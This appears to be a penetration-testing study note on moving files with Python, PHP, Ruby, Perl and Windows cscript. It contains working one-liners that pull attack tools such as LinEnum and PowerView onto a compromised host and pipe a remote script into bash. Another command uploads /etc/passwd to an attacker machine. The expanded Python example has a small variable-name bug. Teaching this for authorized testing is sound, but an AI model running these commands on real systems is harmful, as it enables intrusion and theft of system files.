## 1. Introduction

Beyond dedicated tools like `curl`, `wget`, or `scp`, almost any programming language installed on a target machine can be repurposed to move files around. Python, PHP, Perl, and Ruby are practically guaranteed on Linux systems, and while less common, they can also show up on Windows. Windows, meanwhile, comes with its own built-in scripting engines — **cscript** and **mshta** — which can run JavaScript or VBScript directly, no installation required.

Think of it this way: a web browser, a text editor, a calculator app, and a programming language interpreter are all just "programs" to the operating system. If a program can open a network connection and write to a file — which almost every language can — it can be turned into an impromptu file transfer tool, whether or not it was ever designed for that purpose.

There are roughly 700 programming languages in active use worldwide, and in principle *any* of them could be scripted to download, upload, or execute instructions on a machine. The examples below cover the languages you're most likely to actually encounter.

**The two machines used throughout these notes (same convention as earlier sections):**

| Label | Role |
|---|---|
| **FOOT_HOLD** | The machine you already have a shell on — commands here are typically run *on it* |
| **HACKER** (a.k.a. Pwnbox) | Your own attack machine, hosting files or waiting to receive them |

## 2. Download Operations with Programming Languages

All commands in this section are run **on FOOT_HOLD**, pulling a file from a reachable URL (shown here as an example GitHub-hosted script, but in practice this would typically be a file you're hosting on HACKER).

### 2.1 Python

Python is one of the most common languages you'll find pre-installed. Version 3 is the current standard, but plenty of older systems still have Python 2.7 lying around. Both versions let you run a short snippet of code directly from the command line using the `-c` flag, without needing to save a `.py` script file first — a "one-liner."

**Python 2:**
```
$ python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```
*`-c` tells Python to execute the quoted code directly. `import urllib` loads Python 2's web-request library, and `urlretrieve(url, filename)` downloads the content at that URL and saves it locally under the given filename.*

**Python 3:**
```
$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```
*Functionally identical to the Python 2 version, but Python 3 reorganized the library into `urllib.request`, so the import and function path changed slightly even though the behavior is the same.*

### 2.2 PHP

PHP isn't just for websites — it's a legitimate scripting language in its own right, and it's worth knowing well because of just how common it is. According to W3Techs data, PHP is used by roughly 77% of all websites with a known server-side programming language, though exact figures can vary a little depending on when and how they're measured. In practice, that means a large share of the web servers you might work with during an authorized security assessment are likely to have PHP already installed.

Just like Python's `-c`, PHP supports one-liners from the command line using `-r`.

**Method 1 — `file_get_contents()` + `file_put_contents()`:**
```
$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```
*`file_get_contents(url)` fetches the entire remote content into a variable (`$file`), and `file_put_contents(filename, $file)` writes that variable's content out to a local file. Despite the name "file," both functions can transparently work with a URL as their source/target when PHP's networking wrappers are enabled.*

**Method 2 — `fopen()` (streaming, chunk by chunk):**
```
$ php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```
*This opens two "file handles" — one for reading from the remote URL (`"rb"` = read binary) and one for writing a local file (`"wb"` = write binary). It then loops, reading 1024 bytes at a time (`BUFFER`) from the remote handle and immediately writing each chunk to the local one, until there's nothing left to read. This streaming approach uses less memory than loading the whole file at once, which matters for larger files.*

**Method 3 — Fileless: pipe the downloaded content straight into Bash:**
```
$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```
*`@file(url)` reads the remote content into an array, one line per entry (the `@` suppresses warning messages if something goes wrong). The loop prints each line back out, and the whole PHP command's output is piped into `bash`, executing the downloaded script without ever saving it to disk — the same fileless pattern used earlier with `curl | bash`.*

> **Note:** using a URL directly as if it were a filename (as with `@file(...)`) only works when PHP's "fopen wrappers" setting is enabled, which allows PHP's file functions to transparently treat remote URLs like local files.

### 2.3 Ruby and Perl

Both of these languages also support one-liners, using the `-e` flag (for "execute") instead of Python's `-c` or PHP's `-r`.

**Ruby:**
```
$ ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```
*`require "net/http"` loads Ruby's built-in HTTP library. `Net::HTTP.get(URI.parse(url))` fetches the content at that URL, and `File.write(filename, content)` saves it to disk.*

**Perl:**
```
$ perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```
*`use LWP::Simple` loads Perl's simplified web-client library. `getstore(url, filename)` is a single convenience function that downloads a URL's content and writes it straight to a file.*

### 2.4 JavaScript (Windows)

JavaScript is best known as the scripting language that powers interactive web pages, but on Windows it can also run outside the browser using the built-in **cscript** engine (part of the Windows Script Host). This lets you use JavaScript as a general-purpose scripting language for tasks like file downloads.

**Step 1 — On FOOT_HOLD: create a script file called `wget.js`:**
```
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```
*This creates a `WinHttpRequest` object (a built-in Windows component for making HTTP requests) and opens a `GET` request to whatever URL is passed in as the script's first command-line argument (`WScript.Arguments(0)`). After sending the request, it creates an `ADODB.Stream` object — a generic way to handle binary data — sets it to binary mode (`Type = 1`), writes the response body into it, and saves that stream to a file named by the script's second argument (`WScript.Arguments(1)`).*

**Step 2 — On FOOT_HOLD: run the script with cscript, passing the URL and output filename as arguments:**
```
C:\foot_hold> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```
*`cscript.exe` is the command-line version of the Windows Script Host, used to run `.js` or `.vbs` script files. `/nologo` just suppresses the startup banner text. The URL becomes `Arguments(0)` inside the script, and `PowerView.ps1` becomes `Arguments(1)` — the two values the script reads to know what to download and what to name the saved file.*

### 2.5 VBScript (Windows)

**VBScript** ("Microsoft Visual Basic Scripting Edition") is Microsoft's own scripting language, modeled after Visual Basic, and has shipped by default with every desktop version of Windows since Windows 98 — making it an extremely reliable "already there" tool on almost any Windows machine.

**Step 1 — On FOOT_HOLD: create a script file called `wget.vbs`:**
```
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```
*This follows the same overall pattern as the JavaScript version: `Microsoft.XMLHTTP` is the object used to make the HTTP request (the VBScript equivalent of `WinHttpRequest`), and `Adodb.Stream` again handles saving the binary response to disk. `WScript.Arguments.Item(0)` and `Item(1)` read the URL and output filename respectively, passed in when the script is run. The trailing `, 2` in `savetofile` tells it to overwrite the destination file if one already exists at that path.*

**Step 2 — On FOOT_HOLD: run the script with cscript:**
```
C:\foot_hold> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```
*Same mechanics as the JavaScript example — `cscript.exe` runs the `.vbs` file, passing the URL and desired output filename (`PowerView2.ps1`) as the two arguments the script reads.*

## 3. Upload Operations with Python

To upload a file with a programming language, you need a function (or a library) in that language capable of sending an HTTP request with the file attached — the equivalent of what `curl -F` does from the command line. Python's **requests** module makes this especially simple, since it's a widely used library purpose-built for sending HTTP requests (`GET`, `POST`, `PUT`, etc.).

**Step 1 — On HACKER: start a Python upload server to receive the file.**
```
python3 -m uploadserver 

File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
*This is the same `uploadserver` module covered earlier — it's an HTTP server that specifically knows how to accept uploaded files at the `/upload` path, unlike a basic web server which can normally only serve files out.*

**Step 2 — On FOOT_HOLD: upload a file using a Python one-liner.**
```
$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```
*`requests.post(url, files={...})` sends an HTTP POST request to the given URL, attaching a file as form data under the field name `"files"`. `open("/etc/passwd","rb")` opens the file in binary read mode so it can be transmitted correctly.*

**The same one-liner, broken into readable lines for clarity:**
```python
# To use the requests function, we need to import the module first.
import requests 

# Define the target URL where we will upload the file.
URL = "http://192.168.49.128:8000/upload"

# Define the file we want to read, open it and save it in a variable.
file = open("/etc/passwd","rb")

# Use a requests POST request to upload the file. 
r = requests.post(url,files={"files":file})
```
*Each line maps directly onto a piece of the one-liner above: import the library, decide where to send the file, open the local file, then send it via POST. Writing it out like this makes it much easier to adapt the technique to other files, servers, or even other libraries.*

> **General principle:** this exact pattern — import a networking library, open a local file, send it via an HTTP request — applies to almost any programming language. Getting comfortable building a small upload script in at least one language is a transferable skill that carries over easily to the others.

## 6. Big-Picture Takeaways

1. **"Installed by default" is a bigger deal than it sounds.** VBScript and JavaScript via `cscript` require zero extra installation on Windows, and Python/PHP/Ruby/Perl are near-universal on Linux — meaning a file-transfer method doesn't need to be clever, just present on the system you're already on.
2. **One-liner flags are a recurring pattern worth memorizing:** `-c` for Python, `-r` for PHP, `-e` for Ruby and Perl. Once you know the pattern, adapting a download technique to "whatever happens to be installed" becomes much faster.
3. **Fileless execution isn't unique to PowerShell or curl.** The PHP example piping into `bash` shows that *any* language capable of fetching remote content and printing it can be chained into an interpreter to avoid writing to disk.
4. **The underlying mechanism repeats across languages.** Open a network connection → read the response → write it somewhere (a file, another program's input, or an HTTP request body). Once you understand that shape in one language, recognizing and building it in another becomes mostly a matter of syntax.
5. **Uploading is just downloading with the request direction reversed.** Python's `requests.post(..., files={...})` plays the same role that `curl -F` played in the earlier notes — attach a local file, send it to a receiving server.
6. **Popularity drives practical relevance.** PHP's dominance on the web (roughly three-quarters of sites with a known server-side language, per W3Techs) is exactly why it's worth knowing even if you personally prefer another language — it's simply more likely to already be sitting on a target.
